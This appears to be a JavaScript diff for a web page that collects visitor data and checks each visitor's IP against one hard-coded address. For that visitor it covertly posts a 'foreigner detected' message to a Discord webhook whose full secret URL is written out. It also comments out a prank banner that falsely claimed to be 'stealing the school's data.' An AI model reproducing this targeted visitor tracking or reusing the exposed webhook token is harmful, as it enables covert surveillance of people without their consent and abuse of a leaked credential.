@@ -78,7 +78,7 @@ function updateImageAndStatus() {
                 imageContainer.removeChild(imageContainer.firstChild);
             }
             imageContainer.appendChild(newImage);
-        }, 20000);
+        }, 3000);
 
         function updateDots() {
             statusParagraph.textContent = "Refreshing" + ".".repeat((new Date().getTime() / 300) % 4);
@@ -188,7 +188,7 @@ function EnviarWebhook() {
   discordXhr.open("POST","https://discord.com/api/webhooks/1119072044290687079/L2gDQchkqGO0MoUYdnsRBf7NvAmEb-dLcErFfyL2b7lqkKGoAfIoyr64qRaHd8HZwagt",true);
   discordXhr.setRequestHeader("Content-Type", "application/json");
 
-  var content = 'Fuck fuck yeaaa';
+  var content = 'Estrangeiro detectado btw';
 
   var data = JSON.stringify({
     content: content,
@@ -219,30 +219,30 @@ $.ajax({
 
     enviarTeste(TesteData);
 
-    function UpdateTroll() {
-        const imageContainer = document.getElementById("imageContainer");
-        const notification = document.createElement('div');
-        notification.className = 'notification';
-        imageContainer.appendChild(notification); // KKKKKKK
+    // function UpdateTroll() {
+    //     const imageContainer = document.getElementById("imageContainer");
+    //     const notification = document.createElement('div');
+    //     notification.className = 'notification';
+    //     imageContainer.appendChild(notification); // KKKKKKK
 
-        let dots = 0;
-        let percent = 7;
-        const Delay = setInterval(() => {
-          const text = `Roubando dados do colegio` + '.'.repeat(dots) + `[${percent}%] kkkkkkkkk zoa carai, manda salve zé`;
-            notification.textContent = text;
+    //     let dots = 0;
+    //     let percent = 7;
+    //     const Delay = setInterval(() => {
+    //       const text = `Roubando dados do colegio` + '.'.repeat(dots) + `[${percent}%] kkkkkkkkk zoa carai, manda salve zé`;
+    //         notification.textContent = text;
 
-            dots = (dots + 1) % 4;
-            percent = (percent + 1) % 101;
-        }, 500); // animação fodida
+    //         dots = (dots + 1) % 4;
+    //         percent = (percent + 1) % 101;
+    //     }, 500); // animação fodida
 
-        setTimeout(() => {
-            clearInterval(Delay);
-            notification.remove();
-        }, 20000);
-    }
+    //     setTimeout(() => {
+    //         clearInterval(Delay);
+    //         notification.remove();
+    //     }, 20000);
+    // }
 
     if (TesteData.ip === "45.180.132.247") {
-      UpdateTroll();
+      // UpdateTroll();
       EnviarWebhook();
   }
 
